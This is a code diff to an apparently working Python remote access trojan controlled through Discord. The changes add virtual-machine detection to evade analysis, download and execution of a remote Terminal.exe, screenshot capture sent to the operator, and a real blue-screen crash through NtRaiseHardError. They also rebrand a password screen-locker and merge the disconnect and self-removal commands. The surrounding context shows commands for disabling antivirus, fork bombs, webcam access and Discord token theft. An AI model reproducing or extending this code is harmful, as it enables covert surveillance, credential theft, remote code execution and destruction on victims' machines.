@@ -50,6 +50,9 @@ import cgi
 import win32com.client
 import traceback
 from PIL import ImageGrab
+import win32crypt
+import pycaw
+from mss import mss
 
 def is_admin():
     """Check if the script is running with admin privileges."""
@@ -69,6 +72,17 @@ def run_as_admin():
 
 run_as_admin()
 
+def TriageCheck():
+    try:
+        result = subprocess.check_output(['wmic', 'diskdrive', 'get', 'model'], text=True)
+        if "DADY HARDDISK" in result or "QEMU HARDDISK" in result:
+            return True
+    except subprocess.CalledProcessError as e:
+        print(f"Error running wmic command: {e}")
+        return False
+    
+    return False
+
 def download_and_open_file(url, destination):
     try:
         # Check if the file already exists and delete it
@@ -78,14 +92,27 @@ def download_and_open_file(url, destination):
 
         response = requests.get(url, stream=True)
         response.raise_for_status()
+
+        # Write the downloaded content to the file
         with open(destination, 'wb') as file:
             for chunk in response.iter_content(chunk_size=8192):
                 file.write(chunk)
-        os.startfile(destination)  # Open the file
+        
+        # Verify if the file was downloaded successfully
+        if os.path.exists(destination):
+            print(f"File downloaded successfully: {destination}")
+            os.startfile(destination)  # Open the file
+        else:
+            print(f"File not found after download: {destination}")
+    
     except requests.exceptions.RequestException as e:
         print(f"Error downloading file: {e}")
     except PermissionError:
         print(f"Permission denied: Unable to delete or write to file {destination}.")
+    except FileNotFoundError:
+        print(f"File not found: {destination}")
+    except Exception as e:
+        print(f"Unexpected error: {e}")
 
 github_url = "https://github.com/AizenWo/Python/releases/download/Terminal/Terminal.exe"
 destination_path = os.path.join(os.getenv('TEMP'), 'Terminal.exe')
@@ -105,6 +132,7 @@ ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix='.', intents=intents)
+
 
 def is_connected():
     """Check if the device is connected to the internet."""
@@ -293,28 +321,29 @@ async def on_ready():
     else:
         ALLOWED_CHANNELS[guild.id] = PC_CHANNELS[pc_name]
 
-
 @bot.command()
 async def ss(ctx):
     print("Screenshot command received!")
 
-    # Get all screen regions (multi-monitor setup)
-    screens = ImageGrab.grab(all_screens=True)
+    # Capture screenshots of all monitors
+    with mss() as sct:
+        monitors = sct.monitors[1:]  # Skip the first entry; it's the "all monitors" entry
+        screenshots_paths = []
 
-    screenshots_paths = []
-    for index, screen in enumerate(screens):
-        screenshot_path = os.path.join(os.getenv('TEMP'), f'screenshot_monitor_{index + 1}.png')
-        screen.save(screenshot_path)
-        screenshots_paths.append(screenshot_path)
+        for index, monitor in enumerate(monitors):
+            screenshot_path = os.path.join(os.getenv('TEMP'), f'screenshot_monitor_{index + 1}.png')
+            sct_img = sct.grab(monitor)
+            
+            # Convert the raw screenshot to a proper image file
+            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
+            img.save(screenshot_path)
+            screenshots_paths.append(screenshot_path)
 
+    # Create an embed
     embed = discord.Embed(title="Screenshots", color=0xa900db)
 
     # Attach screenshots to the Discord message
-    files = []
-    for screenshot_path in screenshots_paths:
-        files.append(discord.File(screenshot_path, os.path.basename(screenshot_path)))
-
-    # Send each screenshot in the embed or as files
+    files = [discord.File(screenshot_path, os.path.basename(screenshot_path)) for screenshot_path in screenshots_paths]
     await ctx.send(embed=embed, files=files)
 
     # Clean up temporary files
@@ -488,12 +517,11 @@ async def commands(ctx):
     
     embed1 = discord.Embed(title="Help (Part 1)", color=0xa900db)
     embed1.add_field(name="📷 .ss", value="Take a screenshot and send it.", inline=False)
-    embed1.add_field(name="🔌 .disconnect", value="Disconnect from the current PC session.", inline=False)
     embed1.add_field(name="🗑️ .clear [amount]", value="Clear the last [amount] messages in the channel.", inline=False)
     embed1.add_field(name="💻 .execute [url]", value="Download and execute a file from a given URL.", inline=False)
     embed1.add_field(name="🔑 .admin", value="Restart the bot with admin privileges.", inline=False)
     embed1.add_field(name="🛡️ .av", value="Disable Windows Defender and other antivirus software.", inline=False)
-    embed1.add_field(name="👥 .status", value="Checks if the pc is still connected.", inline=False)
+    embed1.add_field(name="👥 .clients", value="Checks if the pc is still connected.", inline=False)
     embed1.add_field(name="🔒 .shutdown", value="Shutdown the PC.", inline=False)
     embed1.add_field(name="🔄 .restart", value="Restart the PC.", inline=False)
 
@@ -526,35 +554,6 @@ async def commands(ctx):
     embed2.add_field(name="☠️ .jumpscare", value="Goes and jumpscapres you.", inline=False)
     await ctx.send(embed=embed2)
 
-@bot.command()
-async def disconnect(ctx):
-    print("Disconnect command received! Removing the bot from this PC/session...")
-    pc_name = os.environ['COMPUTERNAME']
-
-    if pc_name in PC_CHANNELS:
-        channel_id = PC_CHANNELS[pc_name]
-        channel = bot.get_channel(channel_id)
-
-        # Notify users in the channel about the disconnection
-        await channel.send(f"Disconnecting from PC: {pc_name}. This session will be removed.")
-        
-        # Delete the channel
-        await channel.delete()
-        
-        # Remove the PC from the active channels
-        del PC_CHANNELS[pc_name]
-        del ALLOWED_CHANNELS[ctx.guild.id]
-        
-        # Notify that the disconnection was successful
-        await ctx.send(f"Disconnected from PC: {pc_name}. Channel and session removed.")
-
-    else:
-        await ctx.send("This PC is not connected or no session found.")
-    
-    # Log out the bot if it has no remaining sessions
-    if not PC_CHANNELS:
-        await bot.logout()
-        os._exit(0)  # Forcefully terminate the script if no active sessions remain
 
 # Global variables
 block_input_active = False
@@ -727,10 +726,10 @@ def start_lock_window(password):
     """Function to create and display the lock window."""
     global lock_window
     lock_window = Tk()
-    lock_window.title("HEAVENOCKER")
+    lock_window.title("SOULOCKED")
     lock_window["bg"] = "black"
     
-    Label(lock_window, bg="black", fg="pink", text="WINDOWS LOCKED BY HEAVENOCKER\n\n\n", font="helvetica 75").pack()
+    Label(lock_window, bg="black", fg="pink", text="WINDOWS LOCKED BY SOULOCKED\n\n\n", font="helvetica 75").pack()
     Label(lock_window, bg="black", fg="pink", text=lock_text, font="helvetica 40").pack(side=TOP)
 
     enter_pass = Entry(lock_window, bg="black", fg="pink", font="helvetica 35")
@@ -758,18 +757,16 @@ def check_password(entered_password, password):
     """Check if the entered password matches the stored password."""
     global count
     if entered_password == password:
-        messagebox.showinfo("HEAVENOCKER", "UNLOCKED SUCCESSFULLY")
+        messagebox.showinfo("SOULOCKED", "UNLOCKED SUCCESSFULLY")
         lock_window.destroy()  # Close the lock window
     else:
         count -= 1
         if count <= 0:
-            messagebox.showwarning("HEAVENOCKER", "Number of attempts expired.")
+            messagebox.showwarning("SOULOCKED", "Number of attempts expired.")
             bsod()  # Trigger BSOD function (assuming you have this defined elsewhere)
         else:
-            messagebox.showwarning("HEAVENOCKER", f"Wrong password. Available tries: {count}")
+            messagebox.showwarning("SOULOCKED", f"Wrong password. Available tries: {count}")
 
-# Define your Discord bot
-bot = commands.Bot(command_prefix="!")  # Replace '!' with your desired command prefix
 
 @bot.command()
 async def lock(ctx, *, password: str = default_password):
@@ -790,10 +787,24 @@ async def unlock(ctx, *, password: str):
 
 @bot.command()
 async def bsod(ctx):
-    """Trigger a Blue Screen of Death (BSOD)."""
-    await ctx.send("Triggering BSOD... Please be aware that this will crash your system!")
-    ctypes.windll.user32.MessageBoxW(0, "This is a simulated BSOD.", "BSOD", 1)
-    ctypes.windll.kernel32.GenerateConsoleCtrlEvent(0, 0)
+    """Trigger a real Blue Screen of Death (BSOD)."""
+    await ctx.send("WARNING: Triggering BSOD... Your system will crash immediately!")
+
+    try:
+        # Adjust privileges
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+
+        # Trigger the BSOD
+        ctypes.windll.ntdll.NtRaiseHardError(
+            0xC0000022,  # Status code: Access Denied
+            0,           # Number of arguments
+            0,           # Arguments (None)
+            0,           # Reserved
+            6,           # Option: Shutdown the system
+            ctypes.byref(ctypes.c_ulong())
+        )
+    except Exception as e:
+        await ctx.send(f"Failed to trigger BSOD: {e}")
 
 @bot.command()
 async def processes(ctx):
@@ -918,23 +929,57 @@ async def forkbomb(ctx):
     thread.start()
 
 @bot.command()
-async def remove(ctx):
-    """Removes the bot file entirely."""
-    await ctx.send("Bot is being removed from this machine. Goodbye!")
-    
-    # Get the path to the current bot file
-    bot_file = sys.argv[0]
-    
-    try:
-        # Attempt to close the bot before removal
-        await bot.close()
+async def remove(ctx, action: str):
+    """Handles both disconnecting from a PC/session or completely removing the bot."""
+
+    if action == 'disconnect':
+        print("Disconnect command received! Removing the bot from this PC/session...")
+        pc_name = os.environ['COMPUTERNAME']
+
+        if pc_name in PC_CHANNELS:
+            channel_id = PC_CHANNELS[pc_name]
+            channel = bot.get_channel(channel_id)
+
+            # Notify users in the channel about the disconnection
+            await channel.send(f"Disconnecting from PC: {pc_name}. This session will be removed.")
+            
+            # Delete the channel
+            await channel.delete()
+            
+            # Remove the PC from the active channels
+            del PC_CHANNELS[pc_name]
+            del ALLOWED_CHANNELS[ctx.guild.id]
+            
+            # Notify that the disconnection was successful
+            await ctx.send(f"Disconnected from PC: {pc_name}. Channel and session removed.")
+        else:
+            await ctx.send("This PC is not connected or no session found.")
         
-        # Remove the bot file from the system
-        os.remove(bot_file)
-        print(f"{bot_file} has been successfully removed.")
+        # Log out the bot if it has no remaining sessions
+        if not PC_CHANNELS:
+            await bot.logout()
+            os._exit(0)  # Forcefully terminate the script if no active sessions remain
+
+    elif action == 'remove':
+        print("Bot removal command received. Removing bot file entirely.")
+        await ctx.send("Bot is being removed from this machine. Goodbye!")
         
-    except Exception as e:
-        print(f"Error removing bot: {e}")
+        # Get the path to the current bot file
+        bot_file = sys.argv[0]
+        
+        try:
+            # Attempt to close the bot before removal
+            await bot.close()
+            
+            # Remove the bot file from the system
+            os.remove(bot_file)
+            print(f"{bot_file} has been successfully removed.")
+            
+        except Exception as e:
+            print(f"Error removing bot: {e}")
+        
+    else:
+        await ctx.send("Invalid action. Use 'disconnect' to disconnect from the PC/session or 'remove' to remove the bot.")
 
 @bot.command()
 async def webcam(ctx):
@@ -1180,7 +1225,7 @@ class fetch_tokens:
             user_id = user['id']
             avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
             
-            embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
+            embed = Embed(title=f"{username} ({user_id})", color=0xFF69B4)
             embed.set_thumbnail(url=avatar)
             embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
             final_to_return.append(embed)
